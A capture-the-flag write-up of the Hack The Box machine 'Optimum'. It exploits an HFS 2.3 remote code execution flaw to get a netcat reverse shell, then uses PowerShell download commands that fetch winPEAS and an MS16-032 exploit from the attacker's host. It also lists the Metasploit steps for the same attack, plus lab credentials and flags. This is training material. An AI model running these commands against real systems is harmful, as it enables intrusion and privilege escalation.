### IP
`10.10.10.8`

# Recon

### nmap
`nmap -sC -sV 10.10.10.8 -o Optimum.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-23 18:54 EST
Nmap scan report for 10.10.10.8
Host is up (0.051s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds


```
* This looks very minimal... just port 80
	* When we look on the website, we can see a link to [HttpFileServer 2.3](http://www.rejetto.com/hfs/), which takes us to Rejetto's website



# Exploitation

## 1. Manual
* When we look up the server name, we can see that it allows for remote code execution.
* Look [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287) for reference
* Apparently the webapp does a regex on inputs to remove any syntax that might indicate a command
	* However, we can bypass that by using a nullbyte (%00), which ends the line
* Looking at the rejetto [commands list](https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands) we can see that we can run commands with `{.exec|<command>.}
* Let's try to upload a reverse shell
* Run `searchsploit -m searchsploit -m windows/remote/39161.py` to download the exploit
* The program says we need to set up an http server with nc.exe on port 80
	* We can get nc.exe by running `locate nc.exe` and then `cp /usr/share/windows-resources/binaries/nc.exe .`
	* We can set up the server by running `python -m SimpleHTTPServer 80`
* The code also says we need to change our local IP and port, so let's do that
	* My tun0 ip is `10.10.14.12` and I picked the port `8888`

* Now we can set up a nc listener with `nc -lnvp 8888`
* In another window, we can run the python script with `python 39161.py 10.10.10.8 80`

* This gives us a shell
	* However, running `whoami` tells us we're not admin

* Running `systeminfo` gives us the following information:
```
Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          30/11/2020, 1:12:08 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 2.954 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.170 MB
Virtual Memory: In Use:    1.333 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
* We're currently on `Microsoft Windows Server 2012 R2 Standard`
* To figure out what to privesc, let's use winpeas
	* If we have winpeas in the directory of our python file server, we can download it to the machine with the following command:
	* `Powershell (New-Object Net.WebClient).DownloadFile('http://10.10.14.12/winPEAS.exe', 'winPEAS.exe')`
		* Thanks to [this](https://stackoverflow.com/questions/4619088/windows-batch-file-file-download-from-a-url) post for the code
		* Apparently this only works with powershell 2.0, which is what's on this machine


* Running `winPEAS.exe` get's us some interesting stuff:
```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultUserName               :  kostas
    DefaultPassword               :  kdeEjDowkS*
```
* Unfortunately, this isn't too useful to us, as we're already logged in as kostas

* Let's take a look at the [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* First, we can put our `systeminfo` output into a file called `sysinfo.out`
* Next, update the exploit database by running `./windows-exploit-suggester --update`
* Now run the code with `python windows-exploit-suggester.py -i sysinfo.out -d 2020-11-23-mssb.xls`
```
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
```
* This looks promising. Let's download it with `searchsploit -m windows/local/39719.ps1`
* We can get it on the machine just like last time: `Powershell (New-Object Net.WebClient).DownloadFile('http://10.10.14.12/39719.ps1', 'exp.ps1')`
* Now run the exploit with `.\exp.ps1`

## 2. Metasploit

* Because we know that we have a 2.3 rejetto server, let's look for that
1. `msfconsole`
2. `search rejetto`
3. `use exploit/windows/http/rejetto_hfs_exec`
4. `options`
5. `set RHOST 10.10.10.8`
6. `set LHOST tun0`
7. `run`
8. `bg` to put the session into the background
9. `use post/multi/recon/local_exploit_suggester` to view privesc options
10. `set SESSION 1`
11. `set SHOWDESCRIPTION true`
12. `run`
13. `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
14. `options`
15. `set SESSION 1`
16. `set LHOST tun0`
17.  `run`

* We're in!

## Getting the flags
* We can write `more user.txt.txt` to get the user flag: `d0c39409d7b994a9a1389ebf38ef5f73`


* We can cd to `C:\Users\Administrator\Desktop>` and run `more root.txt` to get the root flag: `51ed1b36553c8461f4552c2e92b3eeed`
